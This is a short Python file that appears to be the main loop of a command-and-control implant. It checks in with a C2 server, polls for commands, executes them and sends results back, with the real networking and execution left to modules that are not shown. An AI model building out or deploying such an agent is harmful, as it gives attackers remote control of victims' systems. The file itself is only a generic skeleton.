# Import necessary modules
import communication
import commands
import utils
import config

def main():
    # Load configuration
    config = utils.load_config("config.json")
    
    # Check in with C2
    communication.check_in(config)
    
    # Main loop
    while True:
        # Receive commands from C2
        command = communication.receive_command(config)
        
        # Execute command
        if command:
            result = commands.execute_command(command)
            
            # Send result back to C2
            communication.send_result(config, result)
        else:
            utils.sleep(config['check_interval'])

if __name__ == "__main__":
    main()
